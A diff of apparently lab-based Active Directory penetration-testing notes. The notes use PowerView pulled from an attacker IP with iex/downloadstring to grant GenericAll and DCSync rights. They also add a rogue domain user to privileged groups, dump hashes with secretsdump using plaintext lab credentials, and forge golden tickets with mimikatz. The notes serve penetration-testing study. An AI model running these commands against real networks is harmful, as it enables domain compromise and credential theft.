@@ -619,23 +619,39 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
-  * ```powershell
-    # Might need to migrate to sqlsvc process using metasploit
+  *   ```powershell
+      # Might need to migrate to sqlsvc process using metasploit
 
-    # Load PowerView
-    iex (new-object net.webclient).downloadstring('http://192.168.45.215/PowerView.ps1')
+      # Load PowerView
+      iex (new-object net.webclient).downloadstring('http://192.168.45.215/PowerView.ps1')
 
-    # Modify sqlsvc to have full control over the mailadmins group
-    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "mailadmins" -PrincipalIdentity "sqlsvc"
+      # Modify sqlsvc to have full control over the mailadmins group
+      Add-DomainObjectAcl -Rights 'All' -TargetIdentity "mailadmins" -PrincipalIdentity "sqlsvc"
 
-    # Add sqlsvc to mailadmins domain group
-    net group "mailadmins" sqlsvc /add /domain
+      # Add sqlsvc to mailadmins domain group
+      net group "mailadmins" sqlsvc /add /domain
 
-    # Verify that sqlsvc is inside mailadmins group
-    net user sqlsvc /domain
-    ```
+      # Verify that sqlsvc is inside mailadmins group
+      net user sqlsvc /domain
+      ```
+
+
+
+OR.. ![](../.gitbook/assets/image.png)
+
+```powershell
+#Current user is svc-alfresco
+net user bill P@ssw0rd123! /add /domain
+net group "Exchange Windows Permissions" bill /add
+net localgroup "Remote Management Users" bill /add
+
+iex (new-object net.webclient).downloadstring('http://10.10.14.20/PowerView.ps1')
+$pass = convertto-securestring 'P@ssw0rd123!' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\bill', $pass)
+Add-ObjectACL -PrincipalIdentity bill -Credential $cred -Rights DCSync
+```
 
 </details>
 
@@ -815,7 +831,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -899,7 +915,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -1259,7 +1275,7 @@ Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-30
 # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 dir \\ZPH-SVRDC01.zsm.local\c$
